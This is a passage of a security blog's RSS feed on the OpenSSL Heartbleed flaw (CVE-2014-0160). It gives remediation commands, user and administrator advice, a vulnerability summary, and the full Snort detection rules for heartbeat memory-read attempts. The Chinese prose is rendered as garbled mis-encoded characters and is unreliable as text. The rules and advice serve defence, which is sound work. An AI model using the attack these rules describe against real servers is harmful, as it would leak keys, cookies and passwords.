&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rpm -q -a | grep &quot;openssl&quot;  # RedHat
dpkg -l | grep &quot;openssl&quot;    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ¥è‘—è«‹è¨˜å¾—æ’¤éŠ·åŸæœ¬çš„ç°½ç« é‡‘é‘°ï¼Œé‡æ–°ç°½ç½²ï¼Œä¸¦è¨˜å¾—æäº¤ CSR (Certificate Signing Request) çµ¦ CA (Certification Authority)ã€‚&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;openssl req -new -newkey rsa:2048 -nodes -keyout hostname.key -out hostname.csr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;çµæŸå¾Œè¨˜å¾—é‡æ–°å•Ÿå‹•ç›¸é—œæœå‹™&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo service httpd restart      # RedHat
sudo service apache2 restart    # Debian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æœ€å¾Œå†ä½¿ç”¨æª¢æ¸¬å·¥å…·çœ‹è‡ªå·±çš„ç¶²é ä¼ºæœå™¨æˆ–å…¶ä»–ç›¸é—œæœå‹™æ˜¯å¦å·²ç¶“ä¸åœ¨æ¼æ´å—å®³ç¯„åœã€‚&lt;/p&gt;

&lt;h3 id=&quot;æˆ‘ç„¡æ³•æ›´æ–°æˆ‘çš„ä¼ºæœå™¨æˆ‘è©²æ€éº¼åœ¨-ids-åµæ¸¬æ”»æ“Šå‘¢&quot;&gt;æˆ‘ç„¡æ³•æ›´æ–°æˆ‘çš„ä¼ºæœå™¨ï¼Œæˆ‘è©²æ€éº¼åœ¨ IDS åµæ¸¬æ”»æ“Šå‘¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;è‹¥ä½ ä½¿ç”¨ Snort IDSï¼Œå®˜æ–¹å·²ç¶“é‡‹å‡º SID 30510 åˆ° 30517 ä¾†åµæ¸¬ï¼Œä¸¦ä¸”åœ¨ Community Rules ä¸­ä¹Ÿæœ‰åŒ…å«ã€‚
&lt;a href=&quot;http://www.snort.org/snort-rules/#community&quot;&gt;http://www.snort.org/snort-rules/#community&lt;/a&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;SIDs 30510 through 30517 address detection of the heartbleed attack 
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL SSLv3 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 00|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30510; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL TLSv1 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 01|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30511; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL TLSv1.1 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 02|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30512; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;EXTERNAL_NET any -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$HOME_NET&lt;/span&gt; 443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER OpenSSL TLSv1.2 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat read overrun attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_server,established; content:&quot;&lt;/span&gt;|18 03 03|&lt;span class=&quot;s2&quot;&gt;&quot;; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;depth:3;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;reference:cve,2014-0160;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;classtype:attempted-recon; sid:30513; rev:2;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER SSLv3 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 00|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30514; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER TLSv1 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 01|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30515; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER TLSv1.1 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 02|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30516; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) 
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;alert tcp $&lt;/span&gt;HOME_NET 443 -&amp;gt; &lt;span class=&quot;nv&quot;&gt;$EXTERNAL_NET&lt;/span&gt; any &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;SERVER-OTHER TLSv1.2 large 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;heartbeat response - possible ssl heartbleed attempt&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;flow:to_client,established; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;content:&quot;|18 03 03|&quot;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;depth:3; byte_test:2,&amp;gt;,128,0,relative; detection_filter:track 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;by_dst, count 5, seconds 60;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;metadata:policy balanced-ips drop, policy security-ips 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;drop, service ssl;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30517; 
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;rev:3;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;) &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;æ°‘çœ¾èˆ‡ç®¡ç†è€…æ‡‰å°æªæ–½&quot;&gt;æ°‘çœ¾èˆ‡ç®¡ç†è€…æ‡‰å°æªæ–½&lt;/h3&gt;

&lt;p&gt;ä¸å°‘æœ‹å‹ä¾†ä¿¡ã€ç•™è¨€æ´½è©¢ï¼Œåˆ°åº•è‡ªå·±è©²æ€éº¼é‡å°é€™æ¬¡çš„æ¼æ´æ‡‰è®Šï¼Ÿæˆ‘å€‘ç°¡å–®å°±ä¸€èˆ¬æ°‘çœ¾ä»¥åŠç³»çµ±ç®¡ç†è€…èªªæ˜ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä¸€èˆ¬æ°‘çœ¾æ‡‰å°æªæ–½&quot;&gt;ä¸€èˆ¬æ°‘çœ¾æ‡‰å°æªæ–½&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;æ³¨æ„å¸¸ç”¨çš„é‡è¦ç¶²ç«™æœå‹™ï¼Œæ˜¯å¦æœ‰é‡å° Heartbleed æ¼æ´çš„æ›´æ–°æªæ–½ã€‚ä¸å°‘å¤§å…¬å¸éƒ½æœ‰ç™¼å‡ºå…¬å‘Šã€å…¬å‘Šä¿¡ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;è‹¥å¸¸ç”¨ç¶²ç«™æœå‹™æœ‰é­é‡æ­¤é¢¨éšªï¼Œè¨˜å¾—æ›´æ›å¸³è™Ÿå¯†ç¢¼ã€‚&lt;/li&gt;
  &lt;li&gt;è‹¥é€™æ®µæ™‚é–“æœ‰ç¶²ç«™é€šçŸ¥æ›´æ›å¯†ç¢¼ï¼Œä¹Ÿè«‹æ³¨æ„æ˜¯å¦ç‚ºé‡£é­šä¿¡ä»¶ã€‚&lt;/li&gt;
  &lt;li&gt;æ³¨æ„è‡ªå·±çš„å¸³è™Ÿæ˜¯å¦æœ‰ç•°å¸¸æ´»å‹•ã€‚&lt;/li&gt;
  &lt;li&gt;è‹¥ä½¿ç”¨çš„ç¶²ç«™æœå‹™å°±æ˜¯ä¸æ›´æ–°ï¼Œ&lt;strong&gt;ä¸€å¤©ä¸€ä¿¡å‹å–„æé†’ç®¡ç†è€…&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ç³»çµ±ç®¡ç†è€…æ‡‰å°æªæ–½&quot;&gt;ç³»çµ±ç®¡ç†è€…æ‡‰å°æªæ–½&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;æ›´æ–° OpenSSL è‡³ 1.0.1g æˆ– 1.0.2-beta2ï¼Œä¸¦å¯†åˆ‡æ³¨æ„æœ‰ç„¡å¾ŒçºŒæ›´æ–°ã€‚&lt;/li&gt;
  &lt;li&gt;é‡æ–°ç”¢ç”Ÿé‡‘é‘°ï¼ˆPrivate Key å¯èƒ½å¤–æ´©ï¼‰ã€Sessionï¼ˆSession ID å¯èƒ½å¤–æ´©ï¼‰ã€å¯†ç¢¼ï¼ˆå¯†ç¢¼ä¹Ÿå¯èƒ½å¤–æ´©ï¼‰ï¼Œä¸¦ä¸”æ’¤éŠ·åŸæœ¬çš„é‡‘é‘°ã€‚&lt;/li&gt;
  &lt;li&gt;è‹¥ç„¡æ³•æ›´æ–°ï¼Œé‡æ–°ç·¨è­¯ OpenSSL ä»¥é—œé–‰ heartbeat åŠŸèƒ½ã€‚&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ &lt;a href=&quot;http://en.wikipedia.org/wiki/Forward_secrecy&quot;&gt;Perfect Forward Secrecy (PFS)&lt;/a&gt;ï¼Œåœ¨æœªä¾†é¡ä¼¼é¢¨éšªç™¼ç”Ÿæ™‚æ¸›ä½å‚·å®³ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è¨±å¤šæ¥­è€…æŠ±æŒè‘—åƒ¥å€–çš„å¿ƒæ…‹ï¼Œæƒ³èªªå¤–æ´©çš„ç›®æ¨™ä¸æœƒè¼ªåˆ°è‡ªå·±ã€‚å¦‚æœå¤§å®¶çœ‹åˆ°é€™å¹¾å¤©&lt;strong&gt;å…¨ä¸–ç•Œè³‡å®‰äººå“¡ / é§­å®¢ä¸çœ ä¸ä¼‘çš„æ’ˆå–è³‡æ–™&lt;/strong&gt;ï¼Œæ‡‰è©²æœƒå¾¹åº•æ¶ˆæ»…åƒ¥å€–çš„æƒ³æ³•ä¹–ä¹–åšå¥½é˜²è­·ã€‚åœ¨æ¼æ´æ­éœ²çš„é ­å¹¾å¤©ï¼Œå°±å·²ç¶“é™¸çºŒçœ‹åˆ°ä¸å°‘é§­å®¢é€²å…¥ Googleã€Facebookã€Yahoo! ç­‰ä¼ºæœå™¨ï¼Œä¸¦ä¸”æ’°å¯«å¤§è¦æ¨¡æƒæå·¥å…·å¤§é‡æ”»æ“Šã€‚é™¤éä½ æœ‰æŠŠæ¡è‡ªå·±çš„ä¼ºæœå™¨æ²’æœ‰ä»»ä½•é€£ç·šï¼Œä¸ç„¶é‚„æ˜¯è«‹ä¹–ä¹–æ›´æ–°å§ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¤§äº‹ä»¶å¤§å•Ÿç¤º&quot;&gt;å¤§äº‹ä»¶ï¼Œå¤§å•Ÿç¤º&lt;/h3&gt;

&lt;p&gt;é‚„è¨˜å¾—ä¹‹å‰æˆ‘å€‘æåˆ°çš„ã€Œ&lt;a href=&quot;http://devco.re/blog/2014/03/14/3rd-party-software-security-issues/&quot;&gt;ä½¿ç”¨ç¬¬ä¸‰æ–¹å¥—ä»¶æ‰€è¦æ“”è² çš„è³‡å®‰é¢¨éšª&lt;/a&gt;ã€ï¼Ÿé€™æ¬¡çš„äº‹ä»¶å°±æ˜¯ä¸€å€‹è¡€æ·‹æ·‹çš„æ¡ˆä¾‹ã€‚ä¸ç®¡æ˜¯å» å•†ã€ç¤¾ç¾¤ã€å€‹äººé–‹ç™¼è€…çš„ç²—å¿ƒå¤±èª¤ï¼Œæˆ–è€…æ˜¯åœ‹å®¶æ©Ÿå™¨ NSA çš„å¼·åŠ›æ»²é€ï¼Œä½¿ç”¨å„ç¨®ç¬¬ä¸‰æ–¹çš„å¥—ä»¶éƒ½éœ€è¦æ‰¿æ“”æ¥µå¤§çš„é¢¨éšªã€‚ä½†å¯æ‚²çš„æ˜¯ï¼Œæˆ‘å€‘å»ç„¡æ³•ä¸ä½¿ç”¨ã€‚å¾é€™æ¬¡çš„äº‹ä»¶æˆ‘å€‘å¯ä»¥å­¸åˆ°å¹¾ä»¶äº‹æƒ…ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä¸ç®¡å“ªç¨®æ”»æ“Šæ‰‹æ³•ã€å¤šè€èˆŠçš„æ”»æ“Šæ‰‹æ³•ï¼Œåœ¨æœªä¾†éƒ½å¯èƒ½æœƒå†åº¦ç™¼ç”Ÿã€‚&lt;/li&gt;
  &lt;li&gt;ç¨‹å¼ç¢¼çš„ review éå¸¸é‡è¦ï¼Œä¸€å®šè¦åœ¨é–‹ç™¼éç¨‹ä¸­å°å…¥ç¨‹å¼ç¢¼ review æ©Ÿåˆ¶ï¼Œä»¥å…é–‹ç™¼è€…å¯«å‡ºå«æœ‰å®‰å…¨ç–‘æ…®çš„ç¨‹å¼ç¢¼ã€‚&lt;/li&gt;
  &lt;li&gt;åŠ å¯†ã€Session æ§ç®¡ã€é‡‘é‘°æ§ç®¡ç­‰è­°é¡Œï¼Œæ˜¯æ°¸é çš„èª²é¡Œã€‚ä¸€å¤©æ²’è™•ç†å¥½ï¼Œåœ¨æœªä¾†çš„é¢¨éšªä¸­æœƒå†åº¦å—å®³ã€‚&lt;/li&gt;
  &lt;li&gt;é¢¨éšªæ°¸é æœƒç™¼ç”Ÿåœ¨ä½ çŒœä¸åˆ°çš„åœ°æ–¹ï¼Œå¯èƒ½æ˜¯ç¨‹å¼ã€å¯èƒ½æ˜¯å‡½å¼åº«ã€&lt;a href=&quot;http://technews.tw/2013/09/06/most-common-encryption-protocols-are-useless-against-nsa-surveillance/&quot;&gt;å¯èƒ½æ˜¯åŠ å¯†å”å®š&lt;/a&gt;ã€æ›´å¯èƒ½æ˜¯&lt;a href=&quot;http://ckhung0.blogspot.tw/2014/03/dual-ec-drbg.html&quot;&gt;äº‚æ•¸ç”¢ç”Ÿå™¨&lt;/a&gt;ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä¸æ–·çš„å¢å¼·è³‡å®‰æ„è­˜ã€ä¸åœçš„åˆ†äº«æ–°çŸ¥ã€å» å•†åšå¥½è³‡å®‰æ§ç®¡åŠ&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;å®‰å…¨æª¢æ¸¬&lt;/a&gt;ã€æ°‘çœ¾å°ä¼æ¥­å’Œæ”¿åºœè¦æ±‚è³‡è¨Šå®‰å…¨ï¼Œé›†åˆå¤§å®¶çš„åŠ›é‡ï¼Œæ˜¯æ”¹å–„è³‡å®‰å¤§ç’°å¢ƒçš„ä¸äºŒæ³•é–€ã€‚&lt;/p&gt;

&lt;p&gt;ä½ ä»¥ç‚ºè‡ªå·±é€ƒéä¸€åŠ«äº†å—ï¼Ÿä¹Ÿè¨±ä½ çš„èº«é«”å·²ç¶“è¡€æµå¦‚æŸ±ï¼Œè€Œå—œè¡€çš„é¯Šé­šæ­£æ¸¸å‘ä½ ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/</link>
                <guid>https://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect</guid>
                <pubDate>Fri, 11 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL CVE-2014-0160 Heartbleed åš´é‡æ¼æ´ </title>
                <description>&lt;h3 id=&quot;openssl-cve-2014-0160-åš´é‡æ¼æ´&quot;&gt;OpenSSL CVE-2014-0160 åš´é‡æ¼æ´&lt;/h3&gt;

&lt;p&gt;OpenSSL ä»Šå¤©å…¬å‘Šäº†ä¸€å€‹æ¥µåº¦åš´é‡çš„æ¼æ´ï¼ˆ&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160&quot;&gt;CVE-2014-0160&lt;/a&gt;ï¼‰ï¼Œè¢«ç¨±ç‚ºã€Œ&lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed&lt;/a&gt;ã€ï¼Œè€Œä»–ç¢ºå¯¦ä¹Ÿå¦‚åŒå¿ƒè‡Ÿå™´å‡ºè¡€èˆ¬åš´é‡ã€‚é€™å€‹æ¼æ´èƒ½è®“æ”»æ“Šè€…å¾ä¼ºæœå™¨è¨˜æ†¶é«”ä¸­è®€å– 64 KB çš„è³‡æ–™ï¼Œåˆ©ç”¨å‚³é€ heartbeat çš„å°åŒ…çµ¦ä¼ºæœå™¨ï¼Œåœ¨å°åŒ…ä¸­æ§åˆ¶è®Šæ•¸å°è‡´ memcpy å‡½æ•¸è¤‡è£½éŒ¯èª¤çš„è¨˜æ†¶é«”è³‡æ–™ï¼Œå› è€Œæ“·å–è¨˜æ†¶é«”ä¸­å¯èƒ½å­˜åœ¨çš„æ©Ÿæ•è³‡æ–™ã€‚è¨˜æ†¶é«”ä¸­æœ€åš´é‡å¯èƒ½åŒ…å« ssl private keyã€session cookieã€ä½¿ç”¨è€…å¯†ç¢¼ç­‰ï¼Œå› æ­¤å¯èƒ½å› ç‚ºé€™æ¨£çš„æ¼æ´å°è‡´ä¼ºæœå™¨é­åˆ°å…¥ä¾µæˆ–å–å¾—ä½¿ç”¨è€…å¸³è™Ÿã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;è©³ç´°çš„åˆ†æå¯ä»¥åƒé–± &lt;a href=&quot;http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html&quot;&gt;existential type crisis : Diagnosis of the OpenSSL Heartbleed Bug&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;è»Ÿé«”åç¨±ï¼šOpenSSL&lt;/li&gt;
  &lt;li&gt;å½±éŸ¿ç¯„åœï¼š1.0.1 è‡³ 1.0.1f / 1.0.2-beta ~ 1.0.2-beta1&lt;/li&gt;
  &lt;li&gt;ä¿®å¾©ç‰ˆæœ¬ï¼š1.0.1g / 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;å½±éŸ¿ç³»çµ±ç‰ˆæœ¬
    &lt;ul&gt;
      &lt;li&gt;Debian Wheezy (stable), OpenSSL 1.0.1e-2+deb7u4&lt;/li&gt;
      &lt;li&gt;Ubuntu 12.04.4 LTS, OpenSSL 1.0.1-4ubuntu5.11&lt;/li&gt;
      &lt;li&gt;CentOS 6.5, OpenSSL 1.0.1e-15&lt;/li&gt;
      &lt;li&gt;Fedora 18, OpenSSL 1.0.1e-4&lt;/li&gt;
      &lt;li&gt;OpenBSD 5.3 (OpenSSL 1.0.1c 10 May 2012) and 5.4 (OpenSSL 1.0.1c 10 May 2012)&lt;/li&gt;
      &lt;li&gt;FreeBSD 10.0 - OpenSSL 1.0.1e 11 Feb 2013&lt;/li&gt;
      &lt;li&gt;NetBSD 5.0.2 (OpenSSL 1.0.1e)&lt;/li&gt;
      &lt;li&gt;OpenSUSE 12.2 (OpenSSL 1.0.1c)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å½±éŸ¿æœå‹™ï¼šHTTPã€SMTPSã€IMAPSã€POP3S ç­‰ä½¿ç”¨ OpenSSL ä¹‹æœå‹™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OpenSSL çš„å…¬å‘Šå¦‚ä¸‹ï¼š&lt;a href=&quot;https://www.openssl.org/news/secadv_20140407.txt&quot;&gt;https://www.openssl.org/news/secadv_20140407.txt&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;
A missing bounds check in the handling of the TLS heartbeat extension can be
used to reveal up to 64k of memory to a connected client or server.

Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
1.0.1f and 1.0.2-beta1.
&lt;/pre&gt;

